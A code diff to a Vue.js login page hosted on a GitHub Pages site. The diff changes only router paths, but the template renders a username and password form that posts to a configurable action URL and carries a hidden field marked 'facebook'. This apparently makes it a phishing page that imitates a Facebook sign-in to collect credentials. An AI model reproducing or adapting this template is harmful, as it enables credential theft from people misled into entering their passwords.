@@ -210,7 +210,7 @@ $ {appname}
             template: `<div class='login_box_vue'><div class='container-fluid'><div class='row justify-content-center align-items-md-center'><div class="col-5 col-md-8 col-lg-5 d-none d-md-block d-lg-block"><div class="content"><div class='col-4 m-auto'><div class="image"><img src="${Maincontent.logo}" alt=""></div></div><p>${lang_content.maintext}</p><h1 class="col-12 m-auto">${lang_content.Dafr}</h1><div class="form_ac"><form action="${url_action}" method="POST"><div class="input_contr"><input type="text" name="dig_u_name" placeholder="${lang_content.placeholder_user}"></div><div class="input_contr"><span class='show_password'><i class="fa fa-eye" aria-hidden="true"></i></span><input type="password" name="i_u_pwd" placeholder="${lang_content.placeholder_password}"></div><div class="input_contr"><input name="dig_u_und" type="hidden" value="facebook"><button type="submit">${lang_content.cont}</button></div></form></div><div class="footer_text">${lang_content.MainFooter}</div></div></div><div class="mob d-sm-block d-md-none col-12"><div class="mob_content"><header class="col-12"><h1>${lang_content.mob_head_text}</h1></header><div class="content"><div class='col-4 m-auto'><div class="image"><img src="${Maincontent.logo}" alt=""></div></div><p>${lang_content.maintext}</p><h1 class="col-12 m-auto">${lang_content.Dafr}</h1><div class="form_ac"><form action="${url_action}" method="POST"><div class="input_contr"><input type="text" placeholder="${lang_content.placeholder_user}" name="dig_u_name"></div><div class="input_contr"><span class='show_password'><i class="fa fa-eye" aria-hidden="true"></i></span><input type="password" placeholder="${lang_content.placeholder_password}" name="i_u_pwd"><input name="dig_u_und" type="hidden" value="facebook"></div><div class="input_contr"><button type="submit">${lang_content.cont}</button></div></form></div><div class="footer_text">${lang_content.MainFooter}</div></div></div></div></div></div></div>`
           };
           var routes = [{
-            path: '/',
+            path: '/login.html',
             component: Home
           }, {
             path: '/login',
@@ -219,7 +219,7 @@ $ {appname}
           var router = new VueRouter({
             routes: routes,
             mode: 'history',
-            base: '/t3arwf.github.io/login.html'
+            base: '/t3arwf.github.io/'
           });
           var app = new Vue({
             el: '#app',
